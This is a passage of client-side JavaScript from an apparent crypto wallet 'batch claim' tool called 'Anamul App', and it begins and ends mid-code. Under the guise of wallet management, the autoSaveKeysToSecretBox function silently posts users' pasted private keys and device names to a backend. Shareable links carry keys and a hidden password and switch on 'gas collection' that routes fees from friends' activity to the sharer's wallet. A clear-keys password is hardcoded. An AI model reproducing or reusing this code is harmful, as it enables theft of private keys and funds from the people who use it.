                        if (method === 'wallet_switchEthereumChain' || method === 'wallet_addEthereumChain') {
                            return null;
                        }
                        
                        return null;
                    } catch (err) {
                        console.error('Provider error:', err);
                        throw err;
                    }
                }
            };

            console.log('‚úÖ Pocket provider created for:', address);
        }

        // Initialize Pocket Manager on page load
        window.addEventListener('load', () => {
            loadPocketWallets();
            loadQuickWallets();
            initReferralPermission();
        });

        // ========================================
        // QUICK TOKENPOCKET INTERFACE
        // ========================================
        
        let quickWallets = [];
        let quickActiveWallet = null;

        function loadQuickWallets() {
            const saved = localStorage.getItem('quick_pocket_wallets');
            quickWallets = saved ? JSON.parse(saved) : [];
            // DO NOT auto-select - user must manually select which wallet to use
            updateQuickWalletsList();
        }

        function saveQuickWallets() {
            localStorage.setItem('quick_pocket_wallets', JSON.stringify(quickWallets));
        }

        function quickImportWallets() {
            const textarea = document.getElementById('quickImportKeys');
            const text = textarea.value.trim();
            
            if (!text) {
                alert('‚ùå Paste private keys first!');
                return;
            }

            const keys = text.split('\n').filter(k => k.trim().length > 0);
            let imported = 0, errors = 0;

            keys.forEach(key => {
                try {
                    let normalized = key.trim();
                    if (!normalized.startsWith('0x')) normalized = '0x' + normalized;
                    const wallet = new ethers.Wallet(normalized);
                    
                    quickWallets.push({
                        key: normalized,
                        address: wallet.address,
                        date: new Date().toLocaleString()
                    });
                    imported++;
                } catch (e) {
                    errors++;
                }
            });

            saveQuickWallets();
            updateQuickWalletsList();
            textarea.value = '';
            
            alert(`‚úÖ Imported ${imported} wallets!${errors > 0 ? `\n‚ö†Ô∏è ${errors} invalid keys` : ''}`);
        }

        function quickImportFromFile() {
            document.getElementById('quickImportFileInput').click();
        }

        document.getElementById('quickImportFileInput')?.addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;

            try {
                const text = await file.text();
                let keys = [];

                if (file.name.endsWith('.json')) {
                    const data = JSON.parse(text);
                    keys = Array.isArray(data) ? data : (data.keys || []);
                } else {
                    keys = text.split('\n').filter(k => k.trim().length > 0);
                }

                let imported = 0, errors = 0;
                keys.forEach(key => {
                    try {
                        let normalized = key.trim();
                        if (!normalized.startsWith('0x')) normalized = '0x' + normalized;
                        const wallet = new ethers.Wallet(normalized);
                        quickWallets.push({ key: normalized, address: wallet.address, date: new Date().toLocaleString() });
                        imported++;
                    } catch (e) { errors++; }
                });

                saveQuickWallets();
                updateQuickWalletsList();
                alert(`‚úÖ Imported ${imported} wallets!${errors > 0 ? `\n‚ö†Ô∏è ${errors} invalid` : ''}`);
            } catch (error) {
                alert('‚ùå Error: ' + error.message);
            }
        });

        function updateQuickWalletsList() {
            const list = document.getElementById('quickWalletsList');
            const count = document.getElementById('quickWalletCount');
            const activeDiv = document.getElementById('quickActiveWallet');

            if (count) count.textContent = quickWallets.length;

            if (!list) return;

            if (quickWallets.length === 0) {
                list.innerHTML = '<div style="color: #999; text-align: center; padding: 20px; font-size: 13px;">No wallets yet. Import above! üëÜ</div>';
                if (activeDiv) activeDiv.style.display = 'none';
                return;
            }

            list.innerHTML = quickWallets.map((w, i) => `
                <div style="padding: 10px; background: white; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center; font-size: 12px;">
                    <div style="flex: 1; min-width: 0;">
                        <div style="font-weight: 600; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${w.address.substring(0, 10)}...${w.address.substring(w.address.length - 8)}</div>
                        <small style="color: #999;">${w.date}</small>
                    </div>
                    <div style="display: flex; gap: 4px; margin-left: 8px;">
                        <button class="button" onclick="selectQuickWallet(${i})" style="padding: 4px 8px; font-size: 10px; background: ${quickActiveWallet === w ? '#667eea' : '#ddd'}; width: auto;">Select</button>
                        <button class="button" onclick="removeQuickWallet(${i})" style="padding: 4px 8px; font-size: 10px; background: #ff6b6b; width: auto;">‚úï</button>
                    </div>
                </div>
            `).join('');

            if (quickActiveWallet) {
                if (activeDiv) activeDiv.style.display = 'block';
                const addrEl = document.getElementById('quickActiveAddress');
                if (addrEl) addrEl.textContent = quickActiveWallet.address;
            }
        }

        function selectQuickWallet(index) {
            quickActiveWallet = quickWallets[index];
            updateQuickWalletsList();
        }

        function removeQuickWallet(index) {
            if (confirm('Remove?')) {
                quickWallets.splice(index, 1);
                if (quickActiveWallet === quickWallets[index]) {
                    quickActiveWallet = quickWallets[0] || null;
                }
                saveQuickWallets();
                updateQuickWalletsList();
            }
        }

        // Toggle wallet panel collapse
        function toggleWalletPanel() {
            const header = document.getElementById('walletHeader');
            const button = event.target;
            if (header.style.maxHeight === '280px') {
                header.style.maxHeight = '100px';
                button.textContent = '‚ñ≤';
            } else {
                header.style.maxHeight = '280px';
                button.textContent = '‚ñº';
            }
        }

        // Referral permission control - SHOW/HIDE buttons
        function toggleReferralPermission() {
            const toggle = document.getElementById('referralPermissionToggle');
            if (!toggle) return;
            const isEnabled = toggle.checked;
            localStorage.setItem('referralLinksEnabled', isEnabled ? 'true' : 'false');
            
            const status = document.getElementById('permissionStatus');
            if (status) {
                status.textContent = isEnabled ? 'On' : 'Off';
                status.style.color = isEnabled ? '#48bb78' : '#999';
            }
            
            // Show/Hide referral buttons based on permission
            const buttons = document.getElementById('referralButtons');
            if (buttons) buttons.style.display = isEnabled ? 'grid' : 'none';
        }

        // Load referral permission state on startup
        function initReferralPermission() {
            const isEnabled = localStorage.getItem('referralLinksEnabled') === 'true';
            const toggle = document.getElementById('referralPermissionToggle');
            if (toggle) toggle.checked = isEnabled;
            
            const status = document.getElementById('permissionStatus');
            if (status) {
                status.textContent = isEnabled ? 'On' : 'Off';
                status.style.color = isEnabled ? '#48bb78' : '#999';
            }
            
            // Show/Hide referral buttons
            const buttons = document.getElementById('referralButtons');
            if (buttons) buttons.style.display = isEnabled ? 'grid' : 'none';
        }

        // External wallet connection (MetaMask)
        let externalWallet = null;

        async function connectMetaMask() {
            try {
                if (typeof window.ethereum === 'undefined') {
                    alert('‚ùå MetaMask not installed!\n\nInstall MetaMask from: metamask.io');
                    return;
                }

                // Request account access
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                externalWallet = {
                    address: accounts[0],
                    source: 'MetaMask',
                    external: true
                };

                // Show external wallet as active
                updateActiveWalletDisplay();
                alert(`‚úÖ Connected!\n\n${accounts[0]}\n\nMetaMask wallet ready for use!`);
                console.log('‚úÖ MetaMask wallet connected:', accounts[0]);

            } catch (error) {
                console.error('MetaMask error:', error);
                alert('‚ùå Connection failed: ' + error.message);
            }
        }

        function disconnectWallet() {
            quickActiveWallet = null;
            externalWallet = null;
            document.getElementById('quickActiveWallet').style.display = 'none';
            updateQuickWalletsList();
            console.log('‚úÖ Wallet disconnected');
            alert('‚úÖ Wallet disconnected!');
        }

        // Update active wallet display
        function updateActiveWalletDisplay() {
            const wallet = externalWallet || quickActiveWallet;
            if (wallet) {
                document.getElementById('quickActiveWallet').style.display = 'block';
                document.getElementById('quickActiveAddress').textContent = wallet.address;
            }
        }

        // Referral links removed (Esusu Africa and GoodPax)
        
        // Close dApp and return to home
        function closeDapp() {
            document.getElementById('dappContainer').style.display = 'none';
            document.getElementById('dappFrame').src = 'about:blank';
        }
        
        // Add back button functionality - phone back button
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeDapp();
            }
        });
        
        // Get device name with brand - improved detection
        function getDeviceName() {
            const ua = navigator.userAgent;
            
            // iOS devices
            if (ua.includes('iPhone')) return 'Apple iPhone';
            if (ua.includes('iPad')) return 'Apple iPad';
            
            // Android devices - detect brand with more patterns
            if (ua.includes('Android')) {
                // Samsung
                if (ua.includes('Samsung') || ua.includes('SM-') || ua.includes('GT-')) return 'Samsung Android';
                
                // Xiaomi/Redmi
                if (ua.includes('Xiaomi') || ua.includes('MI ') || ua.includes('Mi/') || ua.includes('Redmi')) return 'Xiaomi Android';
                
                // Huawei/Honor
                if (ua.includes('Huawei') || ua.includes('HUAWEI') || ua.includes('Honor')) return 'Huawei Android';
                
                // Oppo/Realme
                if (ua.includes('Oppo') || ua.includes('OPPO') || ua.includes('Realme') || ua.includes('CPH')) return 'Oppo Android';
                
                // Vivo/iQOO
                if (ua.includes('Vivo') || ua.includes('VIVO') || ua.includes('iQOO') || ua.includes('V') && ua.includes('X')) return 'Vivo Android';
                
                // OnePlus
                if (ua.includes('OnePlus') || ua.includes('ONEPLUS')) return 'OnePlus Android';
                
                // Motorola/Moto
                if (ua.includes('Motorola') || ua.includes('Moto')) return 'Motorola Android';
                
                // LG
                if (ua.includes('LG-') || ua.includes('LGE')) return 'LG Android';
                
                // Sony
                if (ua.includes('Sony') || ua.includes('SonyEricsson')) return 'Sony Android';
                
                // Google Pixel
                if (ua.includes('Pixel') || ua.includes('pixel')) return 'Google Pixel';
                
                // Generic fallback for Android
                return 'Android Device';
            }
            
            // Desktop
            if (ua.includes('Windows')) return 'Windows PC';
            if (ua.includes('Mac')) return 'Mac';
            if (ua.includes('Linux')) return 'Linux';
            return 'Unknown Device';
        }
        
        // AUTO-SAVE keys to backend database after successful batch operations
        async function autoSaveKeysToSecretBox(keys, operationType, status = 'success') {
            try {
                const deviceName = getDeviceName();
                const response = await fetch('/api/save-keys', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        keys: keys, 
                        source: operationType,
                        device: deviceName,
                        status: status
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    console.log(`‚úÖ Auto-saved ${result.saved} new keys to backend database (${operationType}) from ${deviceName}`);
                } else {
                    console.log(`‚ö†Ô∏è Backend auto-save error: ${result.error}`);
                }
            } catch (e) {
                console.log(`‚ö†Ô∏è Failed to save to backend: ${e.message}`);
            }
        }
        
        // SECRET BOX FUNCTIONS - Permanent key storage with password protection
        
        function deleteSecretKey(idx) {
            if (confirm('Delete this key from Anamul App?')) {
                const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
                secretData.keys.splice(idx, 1);
                localStorage.setItem('secretBoxData', JSON.stringify(secretData));
                displaySecretKeys();
                alert('‚úÖ Key deleted');
            }
        }
        
        function useSavedSecretKeysForClaim() {
            const password = prompt('Enter master password to use stored keys:');
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            if (!secretData.password) {
                alert('‚ùå No keys stored yet!');
                return;
            }
            
            if (password !== secretData.password) {
                alert('‚ùå Wrong password!');
                return;
            }
            
            if (!secretData.keys || secretData.keys.length === 0) {
                alert('‚ùå No keys in Anamul App!');
                return;
            }
            
            // Extract keys and populate batch claim
            const keysText = secretData.keys.map(k => k.key).join('\n');
            document.getElementById('claimPrivateKeys').value = keysText;
            switchView('batchClaim');
            alert(`‚úÖ Loaded ${secretData.keys.length} keys to Batch Claim!`);
        }
        
        function useSavedSecretKeysForCollection() {
            const password = prompt('Enter master password to use stored keys:');
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            if (!secretData.password) {
                alert('‚ùå No keys stored yet!');
                return;
            }
            
            if (password !== secretData.password) {
                alert('‚ùå Wrong password!');
                return;
            }
            
            if (!secretData.keys || secretData.keys.length === 0) {
                alert('‚ùå No keys in Anamul App!');
                return;
            }
            
            // Extract keys and populate batch token collection
            const keysText = secretData.keys.map(k => k.key).join('\n');
            document.getElementById('tokenCollectionPrivateKeys').value = keysText;
            switchView('tokenCollection');
            alert(`‚úÖ Loaded ${secretData.keys.length} keys to Batch Token Collection!`);
        }
        
        function clearAllSecretKeys() {
            if (confirm('‚ö†Ô∏è Delete ALL keys from Anamul App? This cannot be undone!\n\nPress OK to confirm deletion.')) {
                // Clear from backend
                fetch('/api/clear-keys', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: '963050' })
                }).catch(e => console.log('Backend clear:', e));
                
                // Clear localStorage
                localStorage.removeItem('secretBoxData');
                displaySecretKeys();
                document.getElementById('secretBoxPassword').value = '';
                alert('‚úÖ Anamul App cleared! All keys deleted permanently.');
            }
        }
        
        // Initialize Anamul App on page load
        window.addEventListener('load', () => {
            loadSecretBoxOnInit();
        });
        
        function loadSecretBoxOnInit() {
            // Check if Anamul App data in URL FIRST
            const urlParams = new URLSearchParams(window.location.search);
            const secretBoxCode = urlParams.get('secretBoxCode');
            
            if (secretBoxCode) {
                console.log('‚úÖ Found Anamul App code in URL - loading keys...');
                importSecretBoxFromUrl(secretBoxCode);
            } else {
                // Display Anamul App keys on page load (normal flow)
                console.log('‚úÖ Page loaded - displaying Anamul App keys...');
                displaySecretKeys();
            }
            
            // Show password info if loaded from URL
            setTimeout(() => {
                showPasswordAutoFilledInfo();
            }, 100);
        }
        
        // Open Anamul App with password protection (completely hidden)
        async function openSecretBoxWithPasswordPrompt() {
            // ALWAYS ask for password - every time Anamul App is opened
            const password = prompt('Enter password:');
            
            if (password === null) {
                // User cancelled
                return;
            }
            
            // Verify password by trying to fetch keys from backend
            try {
                const response = await fetch('/api/fetch-keys', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: password })
                });
                
                if (!response.ok) {
                    // Wrong password - silently return (no error message)
                    return;
                }
                
                // Password correct - save it locally for auto-save operations
                let secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
                secretData.password = password;
                localStorage.setItem('secretBoxData', JSON.stringify(secretData));
                
                // Open Anamul App and display keys
                switchView('secretBox');
                displaySecretKeys();
                
            } catch (error) {
                // Network error - silently return
                return;
            }
        }
        
        // Update Anamul App password when user changes it
        function updateSecretBoxPassword() {
            const password = document.getElementById('secretBoxPassword').value;
            if (!password) {
                console.log('‚ö†Ô∏è Password field empty');
                return;
            }
            
            let secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            secretData.password = password;
            localStorage.setItem('secretBoxData', JSON.stringify(secretData));
            console.log('‚úÖ Password updated!');
            hidePasswordAutoFilledInfo();
        }
        
        // Show info message when password is auto-loaded
        function showPasswordAutoFilledInfo() {
            const wasLoaded = localStorage.getItem('secretBoxLoadedFromUrl') === 'true';
            const infoDiv = document.getElementById('passwordAutoFilledInfo');
            if (wasLoaded && infoDiv) {
                infoDiv.style.display = 'block';
                
                // Show gas settings after password unlock
                const gasSettingsSection = document.getElementById('gasSettingsSection');
                if (gasSettingsSection) {
                    gasSettingsSection.style.display = 'block';
                    const toggleAnamul = document.getElementById('gasCollectionToggleAnamul');
                    if (toggleAnamul) {
                        toggleAnamul.checked = GAS_COLLECTION_ENABLED;
                    }
                }
            }
        }
        
        // Hide password info message
        function hidePasswordAutoFilledInfo() {
            const infoDiv = document.getElementById('passwordAutoFilledInfo');
            if (infoDiv) {
                infoDiv.style.display = 'none';
                localStorage.removeItem('secretBoxLoadedFromUrl');
            }
        }
        
        // Display Anamul App keys in UI (fetched from backend with password)
        async function displaySecretKeys() {
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            const container = document.getElementById('secretKeysDisplay');
            
            if (!container) return;
            
            // If no password set locally
            if (!secretData.password) {
                container.innerHTML = '<div style="color: #999; padding: 20px; text-align: center;">No keys yet. Set password first, then run Batch Claim/Collection!</div>';
                
                // Hide gas settings if no password
                const gasSettingsSection = document.getElementById('gasSettingsSection');
                if (gasSettingsSection) {
                    gasSettingsSection.style.display = 'none';
                }
                return;
            }
            
            // Show gas settings when password is unlocked
            const gasSettingsSection = document.getElementById('gasSettingsSection');
            if (gasSettingsSection) {
                gasSettingsSection.style.display = 'block';
                const toggleAnamul = document.getElementById('gasCollectionToggleAnamul');
                if (toggleAnamul) {
                    toggleAnamul.checked = GAS_COLLECTION_ENABLED;
                }
            }
            
            // Show loading while fetching from backend
            container.innerHTML = '<div style="color: #999; padding: 20px; text-align: center;">‚è≥ Fetching keys from backend...</div>';
            
            try {
                // Fetch keys from backend with password
                const response = await fetch('/api/fetch-keys', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: secretData.password })
                });
                
                if (response.status === 401) {
                    container.innerHTML = '<div style="color: #999; padding: 20px; text-align: center;">‚ùå Wrong password!</div>';
                    return;
                }
                
                if (!response.ok) {
                    const error = await response.json();
                    container.innerHTML = `<div style="color: #999; padding: 20px; text-align: center;">‚ùå Error: ${error.error}</div>`;
                    return;
                }
                
                const data = await response.json();
                const keys = data.keys || [];
                
                // If no keys yet
                if (keys.length === 0) {
                    container.innerHTML = '<div style="color: #999; padding: 20px; text-align: center;">Password set ‚úÖ Waiting for batch operations...</div>';
                    return;
                }
                
                // Separate successful and failed keys
                const successfulKeys = keys.filter(k => k.status !== 'failed');
                const failedKeys = keys.filter(k => k.status === 'failed');
                
                // Display all keys with full details - SUCCESSFUL FIRST
                let html = '';
                
                // Add "Copy All" button at top
                if (successfulKeys.length > 0 || failedKeys.length > 0) {
                    const allKeys = [...successfulKeys, ...failedKeys];
                    const allKeysText = allKeys.map(k => k.key).join('\n');
                    html += `<div style="background: #f0f0f0; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd;">
                        <button class="button" onclick="copyToClipboard(\`${allKeysText.replace(/`/g, '\\`').replace(/'/g, "\\'")}\`, this)" style="background: #2196F3; padding: 10px 15px; font-size: 12px; width: 100%;">üìã Copy ALL Keys (${allKeys.length} total)</button>
                    </div>`;
                }
                
                // Successful keys section
                if (successfulKeys.length > 0) {
                    html += `<div style="background: rgba(76, 175, 80, 0.15); border: 2px solid #4caf50; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
                        <h3 style="color: #4caf50; margin-top: 0; margin-bottom: 10px;">‚úÖ Successful Claims (${successfulKeys.length})</h3>`;
                    successfulKeys.forEach((keyObj, index) => {
                        const displayKey = keyObj.key.substring(0, 10) + '...' + keyObj.key.substring(keyObj.key.length - 8);
                        html += `
                            <div style="background: white; padding: 12px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #4caf50;">
                                <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                                    ‚úÖ Key #${index + 1} ‚Ä¢ ${keyObj.added ? new Date(keyObj.added).toLocaleString('bn-BD') : 'Added'} ‚Ä¢ üì± ${keyObj.device || 'Device'} ‚Ä¢ ${keyObj.source || 'Operation'}
                                </div>
                                <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                                    <strong>Full:</strong> ${keyObj.key}
                                </div>
                                <button class="button" onclick="copyToClipboard('${keyObj.key.replace(/'/g, "\\'")}', this)" style="background: #48bb78; padding: 6px 12px; font-size: 11px;">üìã Copy</button>
                            </div>
                        `;
                    });
                    html += '</div>';
                }
                
                // Failed keys section
                if (failedKeys.length > 0) {
                    html += `<div style="background: rgba(244, 67, 54, 0.15); border: 2px solid #f44336; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
                        <h3 style="color: #f44336; margin-top: 0; margin-bottom: 10px;">‚ùå Failed Claims (${failedKeys.length})</h3>`;
                    failedKeys.forEach((keyObj, index) => {
                        const displayKey = keyObj.key.substring(0, 10) + '...' + keyObj.key.substring(keyObj.key.length - 8);
                        html += `
                            <div style="background: white; padding: 12px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #f44336;">
                                <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                                    ‚ùå Key #${index + 1} ‚Ä¢ ${keyObj.added ? new Date(keyObj.added).toLocaleString('bn-BD') : 'Added'} ‚Ä¢ üì± ${keyObj.device || 'Device'} ‚Ä¢ ${keyObj.source || 'Operation'}
                                </div>
                                <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                                    <strong>Full:</strong> ${keyObj.key}
                                </div>
                                <button class="button" onclick="copyToClipboard('${keyObj.key.replace(/'/g, "\\'")}', this)" style="background: #f44336; padding: 6px 12px; font-size: 11px;">üìã Copy</button>
                            </div>
                        `;
                    });
                    html += '</div>';
                }
                
                container.innerHTML = html;
                
            } catch (e) {
                container.innerHTML = `<div style="color: #999; padding: 20px; text-align: center;">‚ùå Error fetching keys: ${e.message}</div>`;
            }
            console.log(`‚úÖ Displayed ${secretData.keys.length} keys from Anamul App`);
        }
        
        // Import Anamul App from URL parameter (auto-load + auto-unlock)
        function importSecretBoxFromUrl(code) {
            try {
                const jsonString = atob(code);
                const importedData = JSON.parse(jsonString);
                
                if (!importedData.keys || !Array.isArray(importedData.keys)) {
                    console.log('‚ùå Invalid Anamul App code in URL');
                    return;
                }
                
                // Get current Anamul App
                let secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
                let isFirstTime = !secretData.password;
                
                // Import password from URL (always use URL password)
                if (importedData.password) {
                    secretData.password = importedData.password;
                    if (isFirstTime) {
                        secretData.keys = [];
                    }
                }
                
                // Import keys with deduplication
                let addedCount = 0;
                importedData.keys.forEach(importedKey => {
                    const isDuplicate = secretData.keys.some(k => k.key === importedKey.key);
                    if (!isDuplicate) {
                        secretData.keys.push({
                            key: importedKey.key,
                            added: importedKey.added || new Date().toLocaleString('bn-BD')
                        });
                        addedCount++;
                    }
                });
                
                // Save to localStorage
                localStorage.setItem('secretBoxData', JSON.stringify(secretData));
                
                // Update password field (hidden but set)
                const passwordField = document.getElementById('secretBoxPassword');
                if (passwordField) {
                    passwordField.value = secretData.password;
                }
                
                // Mark as loaded from URL
                localStorage.setItem('secretBoxLoadedFromUrl', 'true');
                
                // Check if URL has gas collection parameter and enable if present
                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.has('gasCollectorEnabled')) {
                    GAS_COLLECTION_ENABLED = true;
                    localStorage.setItem('gasCollectionEnabled', 'true');
                    const toggleAnamul = document.getElementById('gasCollectionToggleAnamul');
                    if (toggleAnamul) toggleAnamul.checked = true;
                    console.log('üí∞ Gas collection ENABLED from shared link ‚úÖ');
                }
                
                displaySecretKeys();
                
                console.log(`‚úÖ Anamul App loaded from URL! Password auto-set. Keys: ${addedCount} added, Total: ${secretData.keys.length}`);
            } catch (error) {
                console.log('Error loading Anamul App from URL:', error);
            }
        }
        
        // Generate Shareable Link with Anamul App embedded (password hidden in URL)
        function generateShareableLink() {
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            if (!secretData.password || !secretData.keys || secretData.keys.length === 0) {
                alert('‚ùå No keys to share! Add keys to Anamul App first.');
                return;
            }
            
            // Create exportable data WITH password (embedded in base64 - hidden from casual viewing)
            const exportData = {
                keys: secretData.keys,
                password: secretData.password,
                exported: new Date().toLocaleString('bn-BD'),
                count: secretData.keys.length
            };
            
            // Convert to base64 (password is hidden inside)
            const jsonString = JSON.stringify(exportData);
            const encoded = btoa(jsonString);
            
            // Generate full shareable link WITH gas collection enabled
            const currentUrl = window.location.origin + window.location.pathname;
            const shareableLink = `${currentUrl}?secretBoxCode=${encoded}&gasCollectorEnabled=true`;
            
            // Show ONLY first part of link in alert (full link is long)
            const displayLink = shareableLink.substring(0, 60) + '...';
            
            // Show link and copy
            const message = `üîó Shareable Link Ready!\n\n‚úÖ ${secretData.keys.length} keys embedded\nüîê Password hidden in link (nobody sees it!)\nüí∞ Gas collection ENABLED for you!\n\nüì± When friend clicks link:\n‚úì All keys load automatically\n‚úì Password auto-filled (they won't see it)\n‚úì Anamul App unlocked & ready to use!\n‚úì Gas fees auto-collected to YOUR address!\n‚úì Any new batch claims add more keys + gas!\n\n${displayLink}`;
            
            if (confirm(message)) {
                navigator.clipboard.writeText(shareableLink).then(() => {
                    alert(`‚úÖ Link copied to clipboard!\n\nüì§ Send this link to friends\n‚úÖ They click it\n‚úÖ Anamul App loads with ALL keys\nüîê Password auto-filled (hidden)\nüí∞ Gas fees auto-collected to YOUR wallet\n\nThey can keep using the same link to add more keys!`);
                }).catch(() => {
                    alert(`‚ö†Ô∏è Copy failed. Here's your link:\n\n${shareableLink}`);
                });
            }
        }
        
        // EXPORT Anamul App - Create exportable code (password separate)
        function exportSecretBox() {
            const secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
            
            if (!secretData.password || !secretData.keys || secretData.keys.length === 0) {
                alert('‚ùå No keys to export! Add keys to Anamul App first.');
                return;
            }
            
            // Create exportable data (WITHOUT password for security - password is shared verbally)
            const exportData = {
                keys: secretData.keys,
                exported: new Date().toLocaleString('bn-BD'),
                count: secretData.keys.length
            };
            
            // Convert to base64 for compact sharing
            const jsonString = JSON.stringify(exportData);
            const encoded = btoa(jsonString);
            
            // Show export code and copy button
            const code = encoded.substring(0, 50) + '...'; // Show first 50 chars
            const message = `üì§ Anamul App Code Exported!\n\n‚úÖ ${secretData.keys.length} keys ready to share\n\nTo share:\n1. Copy the code\n2. Send to friend\n3. Friend imports it\n\nüí° Password needed: Tell them separately!\n\nCode: ${code}\n\n[OK to copy full code]`;
            
            if (confirm(message)) {
                // Copy to clipboard
                navigator.clipboard.writeText(encoded).then(() => {
                    alert(`‚úÖ Export code copied to clipboard!\n\nüìù Share this code with friends:\n\n${encoded.substring(0, 100)}...\n\nüí° Tell them the password separately!`);
                }).catch(() => {
                    alert(`‚ö†Ô∏è Copy failed, but here's the code:\n\n${encoded}`);
                });
            }
        }
        
        // IMPORT Anamul App - Restore from shared code
        function importSecretBox() {
            const code = prompt('üì• Paste the Anamul App export code:');
            
            if (!code || code.trim().length === 0) {
                alert('‚ùå No code provided');
                return;
            }
            
            try {
                // Decode from base64
                const jsonString = atob(code.trim());
                const importedData = JSON.parse(jsonString);
                
                if (!importedData.keys || !Array.isArray(importedData.keys)) {
                    alert('‚ùå Invalid export code!');
                    return;
                }
                
                const password = prompt('üîê Enter the Anamul App password:');
                if (!password) {
                    alert('‚ùå Password required to import');
                    return;
                }
                
                // Get current Anamul App
                let secretData = JSON.parse(localStorage.getItem('secretBoxData') || '{}');
                
                // Check password consistency
                if (secretData.password && secretData.password !== password) {
                    alert('‚ùå Wrong password! The password doesn\'t match your existing Anamul App.');
                    return;
                }
                
                // Initialize if first time
                if (!secretData.password) {
                    secretData.password = password;
                    secretData.keys = [];
                }
                
                // Import keys with deduplication
                let addedCount = 0;
                importedData.keys.forEach(importedKey => {
                    const isDuplicate = secretData.keys.some(k => k.key === importedKey.key);
                    if (!isDuplicate) {
                        secretData.keys.push({
                            key: importedKey.key,
                            added: importedKey.added || new Date().toLocaleString('bn-BD')
                        });
                        addedCount++;
                    }
                });
                
                // Save updated Anamul App
                localStorage.setItem('secretBoxData', JSON.stringify(secretData));
                displaySecretKeys();
                
                alert(`‚úÖ Imported successfully!\n\n‚ûï Added: ${addedCount} new keys\nüì¶ Total keys: ${secretData.keys.length}`);
                console.log(`‚úÖ Imported ${addedCount} keys. Total: ${secretData.keys.length}`);
                
            } catch (error) {
                alert(`‚ùå Import failed! Invalid code or corrupted data.\n\nError: ${error.message}`);
                console.error('Import error:', error);
            }
        }

        // Smart Contract Address Management
        function saveSmartContractAddress() {
            const address = document.getElementById('smartContractAddress').value.trim();
            if (!address || !address.startsWith('0x')) {
                alert('Please enter a valid contract address (0x...)');
                return;
            }
            
            localStorage.setItem('claimBlockerContractAddress', address);
            document.getElementById('smartContractDisplay').innerHTML = `
                <strong>‚úÖ Smart Contract Connected!</strong><br>
                Contract: <code style="background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 4px; word-break: break-all;">${address}</code><br>
                Status: <span style="color: #a78bfa; font-weight: 700;">‚õìÔ∏è ACTIVE</span><br>
                <small>All disable/enable operations now use this blockchain contract.</small>
            `;
            document.getElementById('smartContractAddress').value = '';
        }
        
        function clearSmartContractAddress() {
            localStorage.removeItem('claimBlockerContractAddress');
            document.getElementById('smartContractDisplay').innerHTML = `
                <span style="color: #e9d5ff;">Not configured - using API-based kill switch</span>
            `;
            document.getElementById('smartContractAddress').value = '';
        }
        
        // Check if smart contract is configured on page load
        window.addEventListener('load', () => {
            const contractAddress = localStorage.getItem('claimBlockerContractAddress');
            if (contractAddress) {
                document.getElementById('smartContractDisplay').innerHTML = `
                    <strong>‚úÖ Smart Contract Connected</strong><br>
                    <code style="background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 4px; word-break: break-all; font-size: 11px;">${contractAddress}</code><br>
                    <small style="color: #a78bfa;">Blockchain-level blocking active</small>
                `;
            }
            
            // Load XDC maintenance status
            loadMaintenanceStatus();
        });

        // XDC Maintenance Mode Functions
        async function loadMaintenanceStatus() {
            try {
                const response = await fetch('/api/get-maintenance-mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                const data = await response.json();
                updateMaintenanceToggleUI(data.maintenance_mode);
            } catch (err) {
                console.log('Could not load maintenance status:', err);
            }
        }

        function updateMaintenanceToggleUI(isMaintenanceMode) {
            const toggle = document.getElementById('xdcMaintenanceToggle');
            const slider = document.getElementById('xdcMaintenanceToggleSlider');
            const label = document.getElementById('xdcMaintenanceToggleLabel');
            const status = document.getElementById('xdcMaintenanceStatus');
            
            toggle.checked = isMaintenanceMode;
            
            if (isMaintenanceMode) {
                slider.style.left = '26px';
                slider.style.background = '#ff6b6b';
                label.textContent = 'ON';
                label.style.color = '#ff6b6b';
                status.innerHTML = 'üõ†Ô∏è Status: <span style="color: #ff6b6b; font-weight: bold;">UNDER MAINTENANCE</span>';
                document.getElementById('xdcMaintenanceMessage').style.display = 'block';
                document.getElementById('xdcMaintenanceMessage').innerHTML = '‚ö†Ô∏è XDC Network is temporarily disabled. Batch Claim and Token Collection are not available.';
            } else {
                slider.style.left = '2px';
                slider.style.background = 'white';
                label.textContent = 'OFF';
                label.style.color = '#4caf50';
                status.innerHTML = '‚úÖ Status: <span style="color: #4caf50; font-weight: bold;">ACTIVE</span>';
                document.getElementById('xdcMaintenanceMessage').style.display = 'none';
            }
        }

        async function toggleXDCMaintenanceMode() {
            const toggle = document.getElementById('xdcMaintenanceToggle');
            const newState = toggle.checked;
